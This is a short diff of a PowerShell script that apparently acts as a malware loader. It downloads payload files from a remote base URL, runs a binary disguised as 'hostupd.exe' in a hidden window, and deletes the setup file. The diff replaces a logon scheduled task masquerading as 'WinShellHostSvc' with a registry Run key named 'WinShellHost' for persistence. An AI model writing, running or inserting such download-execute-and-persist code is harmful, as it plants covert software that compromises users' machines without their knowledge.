@@ -8,5 +8,5 @@ Invoke-WebRequest "$base/setup.dat" -OutFile "$dir\setup.dat"
 Invoke-WebRequest "$base/svc.dat" -OutFile "$dir\svc.dat"
 Start-Process -FilePath "$dir\hostupd.exe" -ArgumentList '-local',"$dir\setup.dat" -WindowStyle Hidden -Wait
 Remove-Item "$dir\setup.dat" -Force
-schtasks /Create /TN "WinShellHostSvc" /TR "`"$dir\hostupd.exe`" -local `"$dir\svc.dat`"" /SC ONLOGON /RL HIGHEST /F | Out-Null
-schtasks /Run /TN "WinShellHostSvc" | Out-Null
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinShellHost /t REG_SZ /d "`"$dir\hostupd.exe`" -local `"$dir\svc.dat`"" /f | Out-Null
+Start-Process -FilePath "$dir\hostupd.exe" -ArgumentList '-local',"$dir\svc.dat" -WindowStyle Hidden
